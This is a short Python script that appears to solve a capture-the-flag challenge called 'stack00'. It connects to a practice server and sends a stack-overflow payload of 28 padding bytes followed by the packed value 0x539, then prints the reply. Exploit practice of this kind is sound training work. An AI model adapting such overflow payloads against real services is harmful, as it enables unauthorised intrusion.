#!/usr/bin/env python3

import socket
import struct
import time

def stack00():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('pwnable.hso-hacker.space', 20000))

    payload = 0x539

    s.send(('A' * 28 + struct.pack('<I', payload).decode() + '\n').encode())
    time.sleep(1)
    data = s.recv(1024).decode('utf-8')

    print(data)

if __name__ == '__main__':
    stack00()
